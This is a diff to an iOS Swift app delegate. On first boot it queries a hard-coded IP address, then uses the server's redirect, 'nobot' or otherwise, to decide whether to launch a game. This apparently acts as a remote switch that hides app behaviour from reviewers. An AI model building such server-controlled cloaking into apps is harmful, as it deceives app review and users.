@@ -15,7 +15,6 @@ class DifferentServices: UIResponder, UIApplicationDelegate,  ReachabilityObserv
     static let shared = DifferentServices()
     fileprivate let defaults = UserDefaults.standard
     
-    
     //MARK: - Reachability
     override init() {
         super.init()
@@ -48,14 +47,25 @@ class DifferentServices: UIResponder, UIApplicationDelegate,  ReachabilityObserv
         return defaults.object(forKey:"firstBoot") as? Bool ?? true
     }
     
-    func requestURL() {
+    fileprivate func requestURL() {
         let config = URLSessionConfiguration.default
         let session = URLSession(configuration: config, delegate: self, delegateQueue: nil)
         let url = URL(string:  "http://78.47.187.129/5P1WyX8M")!
         //   let url = URL(string:  "http://ctraf.com/test")!
-
         let task = session.dataTask(with: url, completionHandler: { _, _, _ in })
         task.resume()
+    }
+    
+    fileprivate func gameOrNot(_ redirectURL: String) {
+        if redirectURL == "https://nobot/" {
+            defaults.set(false, forKey: "firstBoot")
+            defaults.set(false, forKey: "game")
+            //FIXME: - One Signal Start
+        } else {
+            defaults.set(false, forKey: "firstBoot")
+            defaults.set(true, forKey: "game")
+            launchTheGame()
+        }
     }
     
     //MARK: - UI
@@ -88,7 +98,7 @@ class DifferentServices: UIResponder, UIApplicationDelegate,  ReachabilityObserv
 extension DifferentServices: URLSessionDataDelegate {
     func urlSession(_ session: URLSession, task: URLSessionTask, willPerformHTTPRedirection response: HTTPURLResponse, newRequest request: URLRequest, completionHandler: @escaping (URLRequest?) -> Void) {
         guard let redirectURL = request.url  else { return }
-        print(#line, redirectURL)
-//        completionHandler(request)
+        gameOrNot(redirectURL.absoluteString)
+        //        completionHandler(request)
     }
 }
